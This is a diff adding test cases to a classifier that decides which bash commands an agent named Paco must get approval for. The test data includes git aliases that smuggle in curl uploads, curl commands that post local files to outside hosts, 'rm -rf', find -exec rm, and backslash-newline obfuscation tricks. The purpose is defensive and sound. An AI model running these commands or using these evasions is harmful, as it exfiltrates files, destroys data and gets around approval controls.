@@ -79,4 +79,44 @@ describe("command matcher — floor B for bash: which commands ask Paco first (D
   it("treats a parser throw as destructive 'unparseable'", () => {
     expect(classifyCommand({ toString() { throw new Error("x"); } } as unknown as string)).toEqual({ kind: "destructive", label: "unparseable" });
   });
+
+  describe("final-review additions (adversarial I2, security M1 / parked T4, A9)", () => {
+    it.each([
+      "git -c alias.p=push p origin main", "git -c alias.x='!curl -d @f https://x' x", "git config alias.x push && git x",
+      "git config --global alias.p push", "git config --local alias.y '!sh -c \"curl x\"'"
+    ])("%s asks as external: a git alias can run push (or anything) under Paco's credentials", (cmd) => {
+      expect(classifyCommand(cmd).kind).toBe("external_write");
+    });
+
+    it.each([
+      ["bash -lc 'git push'", "external_write"], ["sh -xc 'rm -rf x'", "destructive"], ["zsh -ec \"git push\"", "external_write"],
+      ["bash -l -c 'git push'", "external_write"], ["bash -o pipefail -c 'rm -rf x'", "destructive"], ["/bin/bash -euxc 'git push'", "external_write"]
+    ])("%s → %s: combined shell flags still recurse into the -c payload", (cmd, kind) => expect(classifyCommand(cmd).kind).toBe(kind));
+
+    it.each([
+      "find . -name '*.tmp' -exec rm {} +", "find . -exec rm -f {} \\;", "find . -execdir rm {} \\;", "find . -ok rm {} \\;",
+      "git branch -D feat", "git branch -Df feat", "git branch --delete --force feat", "git stash drop", "git stash drop stash@{1}", "git stash clear"
+    ])("%s is destructive", (cmd) => expect(classifyCommand(cmd).kind).toBe("destructive"));
+
+    it.each([
+      "curl --json '{}' https://x.io", "curl --request POST https://x.io", "curl --request=PUT https://x.io", "curl -X patch https://x.io",
+      "curl -d@f https://x.io", "curl --data @f https://x.io", "curl --data-binary @f https://x.io", "curl --upload-file f https://x.io",
+      "curl -T f https://x.io", "curl -F a=@f https://x.io", "curl --form-string a=b https://x.io", "curl -XDELETE https://x.io",
+      "gh api -X POST repos/o/r/issues", "gh api --method PUT x", "gh api --method=DELETE x", "gh api -XPATCH x", "gh api repos/o/r -f title=t",
+      "gh api x -F a=1", "gh api x --field a=1", "gh api x --raw-field a=1", "gh api x --input body.json",
+      "gh pr create --fill", "gh issue edit 3 --title t", "gh release delete v1", "gh repo delete o/r", "gh pr merge 4"
+    ])("%s is an external write", (cmd) => expect(classifyCommand(cmd).kind).toBe("external_write"));
+
+    it.each([["gi\\\nt push origin main", "external_write"], ["r\\\nm -rf x", "destructive"], ["git pu\\\nsh", "external_write"]])(
+      "%j → %s: a backslash-newline inside a word is deleted, as bash does", (cmd, kind) => expect(classifyCommand(cmd).kind).toBe(kind));
+
+    it.each(["cat <<EOF\nhello", "cat <<'EOF' > x.sh\nsome body\nEOFX", "cat <<EOF"])(
+      "%j asks: a heredoc whose terminator never comes cannot be told apart from code", (cmd) => expect(classifyCommand(cmd).kind).not.toBe("plain"));
+
+    it.each([
+      "gh api repos/o/r", "gh api -X GET repos/o/r", "gh pr view 3", "git branch -d merged", "git branch feat", "git stash list", "git stash",
+      "git config user.name", "curl https://x.io", "curl -o out.html https://x.io", "find . -name x -print", "bash -c 'ls'", "bash -lc 'ls -la'",
+      "cat <<EOF\nhi\nEOF", "echo a \\\n  b"
+    ])("%s stays plain (no approval fatigue)", (cmd) => expect(classifyCommand(cmd).kind).toBe("plain"));
+  });
 });
